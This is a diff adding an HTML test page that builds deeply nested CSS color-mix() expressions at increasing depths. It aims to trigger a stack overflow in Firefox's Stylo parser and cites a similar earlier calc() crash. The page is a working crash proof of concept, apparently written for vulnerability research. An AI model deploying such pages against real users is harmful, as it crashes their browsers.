@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>color-mix() Recursion Depth Test</title>
+<style>
+body { background: #111; color: #eee; font-family: monospace; padding: 20px; }
+#status { font-size: 1.2em; margin: 10px 0; }
+</style>
+</head>
+<body>
+<h2>color-mix() Recursion Depth Test</h2>
+<p>Tests whether deeply nested color-mix() causes stack overflow in Stylo CSS parser.</p>
+<p>Same pattern as FF-007 (calc() stack overflow) — Color::parse_internal() recurses without depth limit.</p>
+<div id="status">Generating payload...</div>
+<div id="target" style="width:100px;height:100px;border:2px solid white;">Target</div>
+
+<script>
+// Generate deeply nested color-mix() expression
+// color-mix(in srgb, color-mix(in srgb, color-mix(in srgb, red, blue), blue), blue)
+function generateColorMix(depth) {
+  if (depth <= 0) return 'red';
+  return `color-mix(in srgb, ${generateColorMix(depth - 1)}, blue)`;
+}
+
+// Try increasing depths
+const depths = [100, 500, 1000, 2000, 3000, 5000];
+let currentTest = 0;
+
+function runNextTest() {
+  if (currentTest >= depths.length) {
+    document.getElementById('status').textContent = 'All depths survived. May need higher depth or different approach.';
+    return;
+  }
+  const depth = depths[currentTest];
+  document.getElementById('status').textContent = `Testing depth ${depth}...`;
+
+  // Generate the CSS and apply it
+  // Use requestAnimationFrame to let the UI update
+  requestAnimationFrame(() => {
+    try {
+      const expr = generateColorMix(depth);
+      const style = document.createElement('style');
+      style.textContent = `#target { background-color: ${expr}; }`;
+      document.head.appendChild(style);
+
+      // Force style computation
+      getComputedStyle(document.getElementById('target')).backgroundColor;
+
+      document.getElementById('status').textContent += ` OK (survived depth ${depth})`;
+      currentTest++;
+      setTimeout(runNextTest, 100);
+    } catch(e) {
+      document.getElementById('status').textContent = `Error at depth ${depth}: ${e.message}`;
+    }
+  });
+}
+
+// Also try via inline style for direct parsing path
+function testInlineStyle(depth) {
+  const expr = generateColorMix(depth);
+  document.getElementById('target').style.backgroundColor = expr;
+  getComputedStyle(document.getElementById('target')).backgroundColor;
+}
+
+// Start testing
+// First, try a moderate depth via stylesheet
+setTimeout(runNextTest, 500);
+</script>
+</body>
+</html>
